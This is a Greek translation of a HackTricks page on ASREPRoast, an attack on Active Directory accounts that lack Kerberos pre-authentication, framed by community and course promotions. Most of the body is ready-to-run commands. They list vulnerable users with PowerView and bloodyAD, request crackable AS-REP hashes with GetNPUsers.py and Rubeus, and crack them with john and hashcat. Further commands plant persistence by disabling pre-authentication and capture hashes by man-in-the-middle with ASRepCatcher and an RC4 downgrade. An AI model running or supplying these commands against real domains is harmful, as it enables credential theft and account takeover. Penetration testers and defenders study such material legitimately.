# ASREPRoast

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Συμμετέχετε στον [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) διακομιστή για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Χάκινγκ**\
Ασχοληθείτε με περιεχόμενο που εξετάζει τον ενθουσιασμό και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενήμεροι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενήμεροι με τις νεότερες ανακοινώσεις για νέες αμοιβές ευρημάτων και κρίσιμες ενημερώσεις πλατφόρμας

**Ελάτε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) και αρχίστε να συνεργάζεστε με κορυφαίους χάκερ σήμερα!

## ASREPRoast

Το ASREPRoast είναι μια επίθεση ασφάλειας που εκμεταλλεύεται χρήστες που δεν έχουν το **απαιτούμενο προ-πιστοποιητικό Kerberos**. Κατά βάση, αυτή η ευπάθεια επιτρέπει σε επιτιθέμενους να ζητήσουν πιστοποίηση για έναν χρήστη από τον ελεγκτή τομέα (DC) χωρίς την ανάγκη του κωδικού πρόσβασης του χρήστη. Ο DC στη συνέχεια απαντά με ένα μήνυμα κρυπτογραφημένο με το κλειδί που προέρχεται από τον κωδικό πρόσβασης του χρήστη, το οποίο οι επιτιθέμενοι μπορούν να προσπαθήσουν να αποκρυπτογραφήσουν εκτός σύνδεσης για να ανακαλύψουν τον κωδικό πρόσβασης του χρήστη.

Οι βασικές απαιτήσεις για αυτήν την επίθεση είναι:
- **Έλλειψη προ-πιστοποίησης Kerberos**: Οι στόχοι χρήστες πρέπει να μην έχουν ενεργοποιημένο αυτό το χαρακτηριστικό ασφαλείας.
- **Σύνδεση με τον Ελεγκτή τομέα (DC)**: Οι επιτιθέμενοι χρειάζονται πρόσβαση στον DC για να στείλουν αιτήματα και να λάβουν κρυπτογραφημένα μηνύματα.
- **Προαιρετικός λογαριασμός τομέα**: Έχοντας ένα λογαριασμό τομέα επιτρέπει στους επιτιθέμενους να εντοπίσουν πιο αποτελεσματικά ευάλωτους χρήστες μέσω ερωτημάτων LDAP. Χωρίς τέτοιο λογαριασμό, οι επιτιθέμενοι πρέπει να μαντέψουν τα ονόματα χρηστών.


#### Εντοπισμός ευάλωτων χρηστών (χρειάζονται διαπιστευτήρια τομέα)

{% code title="Χρησιμοποιώντας Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Χρησιμοποιώντας Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Αίτηση μηνύματος AS_REP

{% code title="Χρησιμοποιώντας Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Χρησιμοποιώντας τα Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
Η ροή AS-REP Roasting με το Rubeus θα δημιουργήσει ένα 4768 με έναν τύπο κρυπτογράφησης 0x17 και τύπο προελεύστη προελεύστη 0.
{% endhint %}

### Σπάσιμο
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Διατήρηση

Αναγκάστε το **preauth** να μην απαιτείται για έναν χρήστη όπου έχετε δικαιώματα **GenericAll** (ή δικαιώματα για εγγραφή ιδιοτήτων):

{% code title="Χρησιμοποιώντας τα Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Χρησιμοποιώντας Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## ASREProast χωρίς διαπιστευτήρια
Ένας επιτιθέμενος μπορεί να χρησιμοποιήσει μια θέση man-in-the-middle για να αιχμαλωτίσει πακέτα AS-REP καθώς διασχίζουν το δίκτυο <ins>χωρίς να βασίζεται στο ότι η προελεγμένη πιστοποίηση Kerberos είναι απενεργοποιημένη.</ins> Λειτουργεί επομένως για όλους τους χρήστες στο VLAN.<br>
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) μας επιτρέπει να το κάνουμε. Επιπλέον, το εργαλείο <ins>αναγκάζει τους client υπολογιστές να χρησιμοποιούν τον RC4</ins> αλλάζοντας τη διαπραγμάτευση Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Αναφορές

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Συμμετέχετε στον **Διακομιστή HackenProof Discord** [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Χάκινγκ**\
Ασχοληθείτε με περιεχόμενο που εξετάζει την αγωνία και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενήμεροι με τον γρήγορο κόσμο του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενήμεροι με τις νεότερες ανακοινώσεις για νέες αμοιβές ευρημάτων και κρίσιμες ενημερώσεις πλατφόρμας

**Συμμετέχετε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) και αρχίστε τη συνεργασία με κορυφαίους χάκερ σήμερα!

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου AWS του HackTricks)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**Την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετέχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή την [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
